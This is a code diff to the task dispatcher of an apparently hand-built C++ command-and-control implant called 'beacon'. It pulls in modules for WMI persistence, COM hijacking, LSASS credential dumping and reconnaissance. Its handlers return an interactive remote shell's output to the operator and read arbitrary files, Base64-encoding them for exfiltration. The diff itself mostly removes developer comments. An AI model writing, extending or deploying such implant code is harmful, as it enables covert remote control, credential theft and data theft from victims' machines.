@@ -15,7 +15,12 @@
 #include "../persistence/WmiPersistence.h"
 #include "../persistence/ComHijacker.h"
 #include "../credential/LsassDumper.h"
+#include "../fs/FileSystem.h"
+#include "../recon/DeepRecon.h"
+#include "../crypto/Base64.h"
 #include <stdexcept>
+#include <sstream>
+#include <filesystem>
 
 namespace beacon {
 
@@ -122,14 +127,7 @@ void TaskDispatcher::dispatch(const Task& task) {
                 if (task.cmd == "start") {
                     auto cb = [this](const std::string& out) {
                         Result r; 
-                        r.task_id = "ishell_out"; // usually irrelevant as C2 matches by type or context, but let's be consistent if possible. 
-                        // Actually Python uses "output": "ISHELL_OUTPUT:\n..." inside the result of the *original* task for single cmds, 
-                        // OR asynchronous pushes for the persistently running shell.
-                        // Python sample pushes to `shell_output_queue` which is read by `handle_task` for "input" commands? 
-                        // Wait, looking at Python: `start_interactive_shell` spawns thread that pushes to `shell_output_queue`. 
-                        // Then `handle_task` with `ISHELL` and valid cmd waits for queue.
-                        // Impl: We can just PUSH results asynchronously as they come! 
-                        // "ISHELL_OUTPUT:<data>" is what server expects.
+                        r.task_id = "ishell_out"; 
                         r.output = "ISHELL_OUTPUT:\n" + out;
                         this->pendingResults_.enqueue(r);
                     };
@@ -160,8 +158,6 @@ void TaskDispatcher::dispatch(const Task& task) {
                 std::vector<BYTE> data = fs::ReadFileBinary(task.cmd);
                 if (data.empty()) result.error = "File not found or empty";
                 else {
-                    // Python chunks large files. Here we send it in one go or we would need a more complex chunking logic.
-                    // For now, base64 encode and send.
                     result.output = "FILE_DOWNLOAD:" + std::string(std::filesystem::path(task.cmd).filename().string()) + ":" + crypto::Base64Encode(data);
                 }
                 break;
@@ -254,7 +250,6 @@ void TaskDispatcher::dispatch(const Task& task) {
                 }
                 break;
             }
-            // Add other task types here as they are implemented
             default:
                 result.error = "Unknown or unsupported task type.";
                 break;
